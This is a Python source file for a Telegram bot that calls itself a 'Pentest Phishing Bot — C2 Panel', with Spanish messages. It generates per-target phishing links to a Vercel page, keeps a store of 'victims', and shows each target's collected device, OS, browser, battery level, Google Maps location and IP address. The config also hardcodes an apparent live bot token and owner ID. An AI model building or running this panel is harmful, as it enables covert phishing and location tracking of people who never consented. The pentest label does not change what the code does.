import os
import sys
import json
import uuid
import logging
import asyncio
from datetime import datetime

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== CONFIGURATION ==========
BOT_TOKEN = "8842248531:AAFLjUKst9mYf2IJgP2j4sSK4p_B5tymkik"          # From @BotFather
OWNER_ID = 8505747325                        # YOUR Telegram user ID (integer)
VERCEL_URL = "https://your-project.vercel.app"  # Your Vercel deployment URL
# ====================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# In-memory victim store (for production, use SQLite/JSON file)
victims_db: dict[str, dict] = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Welcome message with instructions."""
    await update.message.reply_markdown(
        "🎯 *Pentest Phishing Bot — C2 Panel*\n\n"
        "Comandos:\n"
        "• `/generate` — Crea un nuevo link de phishing\n"
        "• `/victims` — Lista todas las víctimas\n"
        "• `/data <ID>` — Muestra datos de una víctima específica\n"
        "• `/clear` — Limpia todos los registros\n\n"
        "Los datos de las víctimas llegarán automáticamente aquí."
    )


async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Generate a unique phishing link."""
    victim_id = uuid.uuid4().hex[:8]
    
    victims_db[victim_id] = {
        "created": datetime.now().isoformat(),
        "data": None,
        "received": False
    }
    
    link = f"{VERCEL_URL}/?id={victim_id}"
    
    await update.message.reply_markdown(
        f"✅ *Link Generado*\n\n"
        f"🔗 `{link}`\n\n"
        f"📋 *Victim ID:* `{victim_id}`\n"
        f"⏰ *Creado:* {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"Envía este enlace a tu objetivo. Cuando interactúe "
        f"con la página, recibirás todos los datos aquí."
    )


async def victims(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all victims and their status."""
    if not victims_db:
        await update.message.reply_text("No hay víctimas registradas aún.")
        return
    
    lines = ["📊 *Estado de Víctimas*\n"]
    for vid, vdata in sorted(victims_db.items()):
        status = "✅" if vdata["received"] else "⏳"
        name = vdata["data"].get("device", "—") if vdata["data"] else "—"
        lines.append(f"{status} `{vid}` — {name}")
    
    await update.message.reply_markdown("\n".join(lines))


async def show_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show detailed data for a specific victim ID."""
    if not context.args:
        await update.message.reply_text("Usa: `/data <ID>`")
        return
    
    vid = context.args[0]
    if vid not in victims_db or not victims_db[vid]["data"]:
        await update.message.reply_text(f"No hay datos para `{vid}`")
        return
    
    d = victims_db[vid]["data"]
    text = (
        f"📋 *Datos de Víctima* `{vid}`\n\n"
        f"📱 *Dispositivo:* `{d.get('device', 'N/A')}`\n"
        f"🖥 *OS:* `{d.get('os', 'N/A')}`\n"
        f"🌐 *Browser:* `{d.get('browser', 'N/A')}`\n"
        f"🔋 *Batería:* `{d.get('battery', 'N/A')}`\n"
        f"📍 *Google Maps:* {d.get('location', 'No disponible')}\n"
        f"🌍 *IP:* `{d.get('ip', 'N/A')}`\n"
        f"⏰ *Recibido:* `{d.get('timestamp', 'N/A')}`"
    )
    await update.message.reply_markdown(text)


async def clear_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Clear all victim records."""
    victims_db.clear()
    await update.message.reply_text("🗑 Todos los registros eliminados.")


def main() -> None:
    """Start the bot."""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Configura tu BOT_TOKEN en el script.")
        sys.exit(1)
    if OWNER_ID == 123456789:
        print("❌ ERROR: Configura tu OWNER_ID en el script.")
        sys.exit(1)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("generate", generate))
    app.add_handler(CommandHandler("victims", victims))
    app.add_handler(CommandHandler("data", show_data))
    app.add_handler(CommandHandler("clear", clear_data))
    
    print("🤖 Bot iniciado. Presiona Ctrl+C para detener.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
